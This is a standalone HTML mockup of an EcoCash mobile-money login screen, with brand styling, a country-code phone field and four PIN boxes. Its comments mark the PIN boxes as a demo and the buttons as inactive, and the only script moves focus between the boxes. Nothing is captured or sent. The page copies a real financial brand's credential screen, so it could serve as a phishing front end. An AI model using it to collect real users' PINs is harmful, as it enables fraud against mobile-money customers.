
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#ffffff">

<title>EcoCash</title>

<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: Arial, sans-serif;
}

html, body {
    width: 100%;
    min-height: 100%;
}

body {
    background: #ffffff;
}

.container {
    width: 100%;
    min-height: 100vh;
    min-height: 100dvh;
    display: flex;
    flex-direction: column;
    overflow: hidden;
}

/* WHITE TOP SECTION */

.top-section {
    flex: 1;
    min-height: 430px;
    background: #ffffff;
    padding: 0 22px 55px;
    display: flex;
    flex-direction: column;
    align-items: center;
}

.logo {
    margin-top: 12vh;
    margin-bottom: 38px;
    font-size: 35px;
    font-weight: bold;
    letter-spacing: -1px;
}

.logo span:first-child {
    color: #2472b9;
}

.logo span:last-child {
    color: #d64c58;
}

h3 {
    color: #555;
    font-size: 21px;
    margin-bottom: 35px;
}

/* PHONE NUMBER */

.phone-box {
    width: 100%;
    height: 54px;
    border: 1.5px solid #8799aa;
    border-radius: 7px;
    display: flex;
    align-items: center;
    padding: 0 10px;
    gap: 8px;
}

.phone-box select {
    width: 90px;
    border: none;
    outline: none;
    background: transparent;
    color: #666;
    font-size: 13px;
    padding: 8px 0;
    cursor: pointer;
}

.phone-box input {
    flex: 1;
    min-width: 0;
    height: 100%;
    border: none;
    outline: none;
    font-size: 14px;
    background: transparent;
}

.hint {
    color: #888;
    font-size: 13px;
    margin-top: 17px;
    margin-bottom: 20px;
}

/* DEMO PIN BOXES */

.pin-container {
    display: flex;
    gap: 7px;
    justify-content: center;
}

.pin-container input {
    width: 45px;
    height: 51px;
    border: 1.5px solid #8498aa;
    border-radius: 8px;
    text-align: center;
    font-size: 22px;
    outline: none;
    background: #ffffff;
}

.pin-container input:focus {
    border: 2px solid #2775bc;
    box-shadow: 0 0 4px #a4c8e9;
}

/* BLUE BOTTOM SECTION */

.bottom-section {
    background: #2679c3;
    min-height: 310px;
    width: 100%;
    padding: 105px 20px 25px;
    position: relative;
    color: #ffffff;
    display: flex;
    flex-direction: column;
    align-items: center;
    clip-path: ellipse(100% 100% at 50% 0%);
    margin-top: -35px;
}

.bottom-section p {
    font-size: 13px;
    text-align: center;
    line-height: 1.5;
    margin-bottom: 27px;
}

/* TAPPABLE BUT INACTIVE BUTTONS */

.buttons {
    display: flex;
    gap: 10px;
    width: 100%;
}

.action-btn {
    flex: 1;
    min-height: 70px;
    border: none;
    border-radius: 10px;
    background: #ffffff;
    color: #777777;

    cursor: pointer;
    pointer-events: auto;
    touch-action: manipulation;
    -webkit-tap-highlight-color: transparent;

    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    gap: 7px;
    font-size: 12px;
}

.action-btn .symbol {
    color: #2876b8;
    font-size: 19px;
    font-weight: bold;
}

/* FOOTER */

.version {
    margin-top: auto;
    padding-top: 35px;
    text-align: center;
    font-size: 11px;
    line-height: 2;
    color: #ffffff;
}

.terms {
    color: #ffffff;
    text-decoration: underline;
    cursor: default;
    pointer-events: none;
}

/* RESPONSIVE DESIGN */

@media(max-height: 650px) {
    .logo {
        margin-top: 35px;
        margin-bottom: 20px;
    }

    h3 {
        margin-bottom: 20px;
    }

    .bottom-section {
        min-height: 250px;
        padding-top: 75px;
    }
}

@media(max-width: 360px) {
    .top-section {
        padding-left: 15px;
        padding-right: 15px;
    }

    .pin-container input {
        width: 42px;
        height: 48px;
    }

    .bottom-section {
        padding-left: 15px;
        padding-right: 15px;
    }
}

</style>
</head>

<body>

<div class="container">

    <!-- WHITE TOP SECTION -->

    <div class="top-section">

        <div class="logo">
            <span>Eco</span><span>Cash</span>
        </div>

        <h3>Login</h3>

        <!-- PHONE NUMBER FIELD -->

        <div class="phone-box">

            <select id="country">
            
                <option value="+263">🇿🇼 +263</option>
                <option value="+256">🇺🇬 +256</option>
                <option value="+255">🇹🇿 +255</option>
                <option value="+260">🇿🇲 +260</option>
                <option value="+27">🇿🇦 +27</option>

            </select>

            <input
                type="tel"
                id="phone"
                inputmode="numeric"
                autocomplete="off"
            >

        </div>

        <!-- PIN -->

        <div class="hint">
            Enter your PIN
        </div>

        <div class="pin-container">

            <input
                type="password"
                maxlength="1"
                inputmode="numeric"
                autocomplete="off"
            >

            <input
                type="password"
                maxlength="1"
                inputmode="numeric"
                autocomplete="off"
            >

            <input
                type="password"
                maxlength="1"
                inputmode="numeric"
                autocomplete="off"
            >

            <input
                type="password"
                maxlength="1"
                inputmode="numeric"
                autocomplete="off"
            >

        </div>

        <div style="
            margin-top:15px;
            font-size:11px;
            color:#888;
            text-align:center;
        ">
        </div>

    </div>


    <!-- BLUE BOTTOM SECTION -->

    <div class="bottom-section">

        <p>
            To register an EcoCash wallet or get assistance,
            click below
        </p>

        <div class="buttons">

            <!-- REGISTER: NO ACTION -->

            <button
                class="action-btn"
                type="button"
            >
                <span class="symbol">♟</span>
                Register
            </button>

            <!-- HELP: NO ACTION -->

            <button
                class="action-btn"
                type="button"
            >
                <span class="symbol">ⓘ</span>
                Help & Support
            </button>

        </div>

        <!-- FOOTER -->

        <div class="version">

            v4.0.5p<br>

            By continuing, you agree to the

            <span class="terms">
                Terms and Conditions
            </span>

        </div>

    </div>

</div>


<!-- PIN BOX INTERACTIONS -->

<script>

const pinInputs = document.querySelectorAll(
    '.pin-container input'
);

pinInputs.forEach((input, index) => {

    input.addEventListener('input', () => {

        input.value = input.value
            .replace(/\D/g, '')
            .slice(0, 1);

        if (
            input.value &&
            index < pinInputs.length - 1
        ) {
            pinInputs[index + 1].focus();
        }

        if (
            index === pinInputs.length - 1 &&
            input.value
        ) {
            input.blur();
        }

    });

    input.addEventListener('keydown', (event) => {

        if (
            event.key === 'Backspace' &&
            !input.value &&
            index > 0
        ) {
            pinInputs[index - 1].focus();
        }

    });

});

</script>

</body>
</html>
